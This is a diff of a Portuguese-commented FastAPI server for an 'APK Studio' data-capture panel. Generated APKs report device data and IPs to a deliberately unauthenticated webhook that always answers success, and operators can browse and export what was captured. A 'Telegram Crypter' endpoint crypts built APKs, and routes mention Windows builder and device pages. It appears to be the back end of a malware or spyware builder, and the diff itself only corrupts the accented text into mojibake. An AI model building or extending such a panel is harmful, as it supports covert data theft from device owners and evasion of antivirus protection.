 # ============================================================
-# ðŸš€ APK STUDIO - SISTEMA COMPLETO DE CAPTURA DE DADOS
+# Ã°Å¸Å¡â‚¬ APK STUDIO - SISTEMA COMPLETO DE CAPTURA DE DADOS
 # ============================================================
 
-# ========== HISTÃ“RICO DE BUILDS ==========
+# ========== HISTÃƒâ€œRICO DE BUILDS ==========
 
 @app.get("/api/apk-studio/builds")
 async def list_studio_builds(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """Lista o histÃ³rico de builds de APKs do usuÃ¡rio com resoluÃ§Ã£o exata de arquivos para download"""
+    """Lista o histÃƒÂ³rico de builds de APKs do usuÃƒÂ¡rio com resoluÃƒÂ§ÃƒÂ£o exata de arquivos para download"""
     from models import APKBuild
     builds = db.query(APKBuild).filter(
         APKBuild.owner_id == current_user.id
@@ -8016,7 +8208,7 @@ async def list_studio_projects(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """Lista todos os projetos do usuÃ¡rio"""
+    """Lista todos os projetos do usuÃƒÂ¡rio"""
     from models import APKStudioProject
     
     projects = db.query(APKStudioProject).filter(
@@ -8093,7 +8285,7 @@ async def update_studio_project(
     ).first()
     
     if not project:
-        raise HTTPException(status_code=404, detail="Projeto nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Projeto nÃƒÂ£o encontrado")
     
     # Atualiza campos
     if "name" in project_data:
@@ -8136,7 +8328,7 @@ async def delete_studio_project(
         db.delete(project)
         db.commit()
     
-    return {"message": "Projeto excluÃ­do"}
+    return {"message": "Projeto excluÃƒÂ­do"}
 
 
 # ========== WEBHOOK PARA RECEBER DADOS DOS APKs ==========
@@ -8148,14 +8340,14 @@ async def webhook_receive_data(
     db: Session = Depends(get_db)
 ):
     """
-    ðŸŽ¯ WEBHOOK PÃšBLICO - Recebe dados dos APKs gerados
-    Este endpoint NÃƒO requer autenticaÃ§Ã£o pois Ã© chamado pelos APKs dos clientes
+    Ã°Å¸Å½Â¯ WEBHOOK PÃƒÅ¡BLICO - Recebe dados dos APKs gerados
+    Este endpoint NÃƒÆ’O requer autenticaÃƒÂ§ÃƒÂ£o pois ÃƒÂ© chamado pelos APKs dos clientes
     """
     from models import APKStudioProject, StudioCapturedData, StudioDataField
     from datetime import datetime
     
     try:
-        # Pega dados da requisiÃ§Ã£o
+        # Pega dados da requisiÃƒÂ§ÃƒÂ£o
         data = await request.json()
         client_ip = request.client.host if request.client else "unknown"
         
@@ -8165,8 +8357,8 @@ async def webhook_receive_data(
         ).first()
         
         if not project:
-            logger.warning(f"[WEBHOOK] Projeto nÃ£o encontrado: {project_id}")
-            # Retorna sucesso mesmo assim para nÃ£o dar erro no APK
+            logger.warning(f"[WEBHOOK] Projeto nÃƒÂ£o encontrado: {project_id}")
+            # Retorna sucesso mesmo assim para nÃƒÂ£o dar erro no APK
             return {"status": "ok", "message": "received"}
         
         # Extrai device_info se presente
@@ -8182,7 +8374,7 @@ async def webhook_receive_data(
         )
         db.add(captured)
         
-        # Atualiza/cria campos dinÃ¢micos
+        # Atualiza/cria campos dinÃƒÂ¢micos
         for field_name, field_value in data.items():
             if field_name.startswith("_"):
                 continue  # Ignora campos internos
@@ -8200,7 +8392,7 @@ async def webhook_receive_data(
             elif field_name.lower() in ["telefone", "phone", "celular"]:
                 field_type = "phone"
             
-            # Verifica se campo jÃ¡ existe
+            # Verifica se campo jÃƒÂ¡ existe
             existing_field = db.query(StudioDataField).filter(
                 StudioDataField.project_id == project_id,
                 StudioDataField.field_name == field_name
@@ -8220,18 +8412,18 @@ async def webhook_receive_data(
         
         db.commit()
         
-        logger.info(f"[WEBHOOK] âœ… Dados recebidos para projeto {project_id} de {client_ip}")
-        logger.info(f"[WEBHOOK] ðŸ“¦ Campos: {list(data.keys())}")
+        logger.info(f"[WEBHOOK] Ã¢Å“â€¦ Dados recebidos para projeto {project_id} de {client_ip}")
+        logger.info(f"[WEBHOOK] Ã°Å¸â€œÂ¦ Campos: {list(data.keys())}")
         
         return {"status": "success", "message": "Dados recebidos com sucesso"}
         
     except Exception as e:
-        logger.error(f"[WEBHOOK] âŒ Erro ao processar dados: {e}")
-        # Retorna sucesso para nÃ£o dar erro no APK
+        logger.error(f"[WEBHOOK] Ã¢ÂÅ’ Erro ao processar dados: {e}")
+        # Retorna sucesso para nÃƒÂ£o dar erro no APK
         return {"status": "ok", "error": str(e)}
 
 
-# ========== VISUALIZAÃ‡ÃƒO DE DADOS CAPTURADOS ==========
+# ========== VISUALIZAÃƒâ€¡ÃƒÆ’O DE DADOS CAPTURADOS ==========
 
 @app.get("/api/apk-studio/data/{project_id}")
 async def get_captured_data(
@@ -8244,16 +8436,16 @@ async def get_captured_data(
     """Lista dados capturados de um projeto"""
     from models import APKStudioProject, StudioCapturedData, StudioDataField
     
-    # Verifica se o projeto pertence ao usuÃ¡rio
+    # Verifica se o projeto pertence ao usuÃƒÂ¡rio
     project = db.query(APKStudioProject).filter(
         APKStudioProject.project_id == project_id,
         APKStudioProject.owner_id == current_user.id
     ).first()
     
     if not project:
-        raise HTTPException(status_code=404, detail="Projeto nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Projeto nÃƒÂ£o encontrado")
     
-    # Busca dados com paginaÃ§Ã£o
+    # Busca dados com paginaÃƒÂ§ÃƒÂ£o
     offset = (page - 1) * limit
     
     total = db.query(StudioCapturedData).filter(
@@ -8299,14 +8491,14 @@ async def clear_captured_data(
     """Limpa todos os dados capturados de um projeto"""
     from models import APKStudioProject, StudioCapturedData, StudioDataField
     
-    # Verifica permissÃ£o
+    # Verifica permissÃƒÂ£o
     project = db.query(APKStudioProject).filter(
         APKStudioProject.project_id == project_id,
         APKStudioProject.owner_id == current_user.id
     ).first()
     
     if not project:
-        raise HTTPException(status_code=404, detail="Projeto nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Projeto nÃƒÂ£o encontrado")
     
     # Limpa dados
     db.query(StudioCapturedData).filter(
@@ -8324,7 +8516,7 @@ async def clear_captured_data(
     return {"message": "Dados limpos com sucesso"}
 
 
-# ========== EXPORTAÃ‡ÃƒO DE DADOS ==========
+# ========== EXPORTAÃƒâ€¡ÃƒÆ’O DE DADOS ==========
 
 @app.get("/api/apk-studio/data/{project_id}/export-csv")
 async def export_data_csv(
@@ -8337,14 +8529,14 @@ async def export_data_csv(
     import csv
     import io
     
-    # Verifica permissÃ£o
+    # Verifica permissÃƒÂ£o
     project = db.query(APKStudioProject).filter(
         APKStudioProject.project_id == project_id,
         APKStudioProject.owner_id == current_user.id
     ).first()
     
     if not project:
-        raise HTTPException(status_code=404, detail="Projeto nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Projeto nÃƒÂ£o encontrado")
     
     # Busca todos os dados
     data = db.query(StudioCapturedData).filter(
@@ -8354,7 +8546,7 @@ async def export_data_csv(
     if not data:
         raise HTTPException(status_code=404, detail="Nenhum dado para exportar")
     
-    # Coleta todos os campos Ãºnicos
+    # Coleta todos os campos ÃƒÂºnicos
     all_fields = set()
     for d in data:
         parsed = json.loads(d.data_json) if d.data_json else {}
@@ -8400,14 +8592,14 @@ async def export_data_json(
     """Exporta dados capturados em JSON"""
     from models import APKStudioProject, StudioCapturedData
     
-    # Verifica permissÃ£o
+    # Verifica permissÃƒÂ£o
     project = db.query(APKStudioProject).filter(
         APKStudioProject.project_id == project_id,
         APKStudioProject.owner_id == current_user.id
     ).first()
     
     if not project:
-        raise HTTPException(status_code=404, detail="Projeto nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Projeto nÃƒÂ£o encontrado")
     
     # Busca todos os dados
     data = db.query(StudioCapturedData).filter(
@@ -8431,7 +8623,7 @@ async def export_data_json(
     )
 
 
-# ========== ESTATÃSTICAS DO PROJETO ==========
+# ========== ESTATÃƒÂSTICAS DO PROJETO ==========
 
 @app.get("/api/apk-studio/stats/{project_id}")
 async def get_project_stats(
@@ -8439,19 +8631,19 @@ async def get_project_stats(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """Retorna estatÃ­sticas do projeto"""
+    """Retorna estatÃƒÂ­sticas do projeto"""
     from models import APKStudioProject, StudioCapturedData, StudioDataField
     from sqlalchemy import func
     from datetime import datetime, timedelta, timezone
 
-    # Verifica permissÃ£o
+    # Verifica permissÃƒÂ£o
     project = db.query(APKStudioProject).filter(
         APKStudioProject.project_id == project_id,
         APKStudioProject.owner_id == current_user.id
     ).first()
     
     if not project:
-        raise HTTPException(status_code=404, detail="Projeto nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Projeto nÃƒÂ£o encontrado")
     
     # Total de capturas
     total_captures = db.query(StudioCapturedData).filter(
@@ -8465,14 +8657,14 @@ async def get_project_stats(
         StudioCapturedData.created_at >= today
     ).count()
     
-    # Capturas Ãºltimos 7 dias
+    # Capturas ÃƒÂºltimos 7 dias
     week_ago = utc_now() - timedelta(days=7)
     captures_week = db.query(StudioCapturedData).filter(
         StudioCapturedData.project_id == project_id,
         StudioCapturedData.created_at >= week_ago
     ).count()
     
-    # IPs Ãºnicos
+    # IPs ÃƒÂºnicos
     unique_ips = db.query(func.count(func.distinct(StudioCapturedData.device_ip))).filter(
         StudioCapturedData.project_id == project_id
     ).scalar()
@@ -8494,8 +8686,8 @@ async def get_project_stats(
     }
 
 
-# NOTA: Os endpoints de build do APK Studio estÃ£o definidos acima (linhas ~3418-3482)
-# para evitar duplicaÃ§Ã£o de rotas
+# NOTA: Os endpoints de build do APK Studio estÃƒÂ£o definidos acima (linhas ~3418-3482)
+# para evitar duplicaÃƒÂ§ÃƒÂ£o de rotas
 
 
 # ==================== TELEGRAM CRYPTER API ====================
@@ -8504,7 +8696,7 @@ from telegram_crypter import telegram_crypter, get_telegram_status
 
 @app.get("/api/telegram/status")
 async def telegram_status(current_user: Operator = Depends(get_current_user)):
-    """Retorna status da integraÃ§Ã£o Telegram"""
+    """Retorna status da integraÃƒÂ§ÃƒÂ£o Telegram"""
     return get_telegram_status()
 
 @app.post("/api/telegram/configure")
@@ -8525,7 +8717,7 @@ async def telegram_configure(
     bot_username = data.get("bot_username", "")
     
     if not all([api_id, api_hash, phone, bot_username]):
-        raise HTTPException(400, "Todos os campos sÃ£o obrigatÃ³rios")
+        raise HTTPException(400, "Todos os campos sÃƒÂ£o obrigatÃƒÂ³rios")
     
     telegram_crypter.configure(api_id, api_hash, phone, bot_username)
     return {"status": "configured", "message": "Telegram configurado com sucesso"}
@@ -8544,13 +8736,13 @@ async def telegram_verify_code(
     data: dict,
     current_user: Operator = Depends(get_current_user)
 ):
-    """Envia cÃ³digo de verificaÃ§Ã£o"""
+    """Envia cÃƒÂ³digo de verificaÃƒÂ§ÃƒÂ£o"""
     if not current_user.is_admin:
         raise HTTPException(403, "Apenas admin")
     
     code = data.get("code", "")
     if not code:
-        raise HTTPException(400, "CÃ³digo nÃ£o fornecido")
+        raise HTTPException(400, "CÃƒÂ³digo nÃƒÂ£o fornecido")
     
     result = await telegram_crypter.submit_code(code)
     return result
@@ -8566,7 +8758,7 @@ async def telegram_verify_password(
     
     password = data.get("password", "")
     if not password:
-        raise HTTPException(400, "Senha nÃ£o fornecida")
+        raise HTTPException(400, "Senha nÃƒÂ£o fornecida")
     
     result = await telegram_crypter.submit_password(password)
     return result
@@ -8593,7 +8785,7 @@ async def telegram_crypt_apk(
         
     apk_path = data.get("apk_path", "")
     if not apk_path:
-        raise HTTPException(400, "Caminho do APK nÃ£o fornecido")
+        raise HTTPException(400, "Caminho do APK nÃƒÂ£o fornecido")
         
     safe_name = os.path.basename(apk_path)
     server_dir = os.path.dirname(os.path.abspath(__file__))
@@ -8601,7 +8793,7 @@ async def telegram_crypt_apk(
     resolved_path = os.path.abspath(os.path.join(downloads_dir, safe_name))
     
     if not resolved_path.startswith(downloads_dir) or not os.path.exists(resolved_path):
-        raise HTTPException(404, f"APK nÃ£o encontrado: {safe_name}")
+        raise HTTPException(404, f"APK nÃƒÂ£o encontrado: {safe_name}")
         
     result = await telegram_crypter.crypt_apk(resolved_path)
     return result
@@ -8613,16 +8805,16 @@ async def serve_spa_frontend(full_path: str):
     Redireciona todas as sub-rotas frontend (ex: /win-builder, /win-device/...) para o index.html
     """
     if full_path.startswith("api/") or full_path.startswith("ws"):
-        raise HTTPException(status_code=404, detail="Endpoint API nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Endpoint API nÃƒÂ£o encontrado")
     
     server_dir = os.path.dirname(os.path.abspath(__file__))
     dist_index = os.path.join(server_dir, "web-dist", "index.html")
     if os.path.exists(dist_index):
         return FileResponse(dist_index, media_type="text/html")
-    raise HTTPException(status_code=404, detail="Painel Web nÃ£o encontrado")
+    raise HTTPException(status_code=404, detail="Painel Web nÃƒÂ£o encontrado")
 
 
-# ==================== INICIALIZAÃ‡ÃƒO ====================
+# ==================== INICIALIZAÃƒâ€¡ÃƒÆ’O ====================
 
 if __name__ == "__main__":
     import uvicorn
